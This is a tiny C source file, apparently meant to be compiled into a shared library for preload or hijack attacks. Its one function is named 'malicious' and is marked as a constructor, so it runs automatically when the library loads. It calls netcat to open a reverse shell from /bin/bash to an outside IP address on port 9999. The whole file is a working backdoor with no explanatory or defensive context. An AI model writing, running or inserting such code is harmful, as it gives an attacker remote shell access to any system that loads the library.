#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("nc 198.13.47.9 9999 -e /bin/bash");
}